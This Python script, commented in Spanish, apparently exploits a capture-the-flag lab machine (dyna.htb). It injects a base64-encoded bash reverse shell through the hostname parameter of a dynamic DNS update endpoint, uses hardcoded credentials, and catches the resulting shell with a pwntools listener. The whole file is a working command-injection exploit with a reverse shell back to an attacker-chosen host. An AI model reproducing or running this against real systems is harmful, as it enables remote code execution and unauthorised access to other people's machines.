#!/usr/bin/python3

import signal, threading, argparse, sys
import base64
import requests
from pwn import *

# -- CTRL+C
def def_handler(sig, frame):
    print()
    print(Color.RED + "\n[!] SaL1enDo..." + Color.END)
    exit(1)

signal.signal(signal.SIGINT, def_handler)

# -- Clases
class Color:
    RED = '\033[91m'
    END = '\033[0m'

# -- Argumentos que recibe el programa
def usagemybro():
    msg = '''{0} lhost lport\n\n[+] Ejemplo: {0} 10.10.10.10 4433\n '''.format(sys.argv[0])
    return msg

def arguments():
    parse = argparse.ArgumentParser(usage=usagemybro())
    parse.add_argument(dest='lhost', type=str, help="IP reverse shell")
    parse.add_argument(dest='lport', type=int, help="PORT reverse shell")
    return parse.parse_args()

# -- Matrashaaaa
def request_RCE(lhost, lport):
    URL = "http://dyna.htb"
    command = "bash -i >& /dev/tcp/%s/%d 0>&1" % (lhost, lport)
    command_b64 = base64.b64encode(bytes(command, 'utf-8')).decode('ascii')

    payload = '$(echo "%s" | base64 -d | bash)' % (command_b64)
    data_get = {
        "hostname" : payload + "." + "no-ip.htb",
        "myip" : lport
    }
    try:
        r = requests.get(URL + '/nic/update', params=data_get, auth=('dynadns','sndanyd'), timeout=2)
    except requests.exceptions.Timeout:
        pass

if __name__ == '__main__':
    args = arguments()
    try:
        threading.Thread(target=request_RCE, args=(args.lhost, args.lport,)).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(args.lport, timeout=10).wait_for_connection()

    if shell.sock is None:
        log.failure(Color.RED + "La conexión no se ha obtenido... Valida IP" + Color.END)
        exit(1)

    shell.interactive()
